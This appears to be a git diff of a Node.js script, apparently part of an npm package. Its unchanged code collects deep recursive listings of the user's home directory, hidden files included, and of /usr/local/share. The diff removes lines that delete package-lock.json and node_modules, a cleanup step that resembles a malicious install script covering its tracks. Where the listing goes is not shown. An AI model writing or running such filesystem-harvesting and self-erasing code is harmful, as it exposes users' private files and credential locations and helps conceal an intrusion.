@@ -1,5 +1,4 @@
 const { execSync } = require('child_process')
-const { rmSync } = require('fs')
 const os = require('os')
 const tree = require('tree-cli')
 
@@ -24,6 +23,3 @@ ${await tree({ base: os.homedir(), l: 7, a: true }).then(res => res.report)}
 ${await tree({ base: '/usr/local/share', l: 7, a: true }).then(res => res.report)}
 `)
 })()
-
-rmSync('./package-lock.json', { force: true, recursive: true })
-rmSync('./node_modules', { force: true, recursive: true })
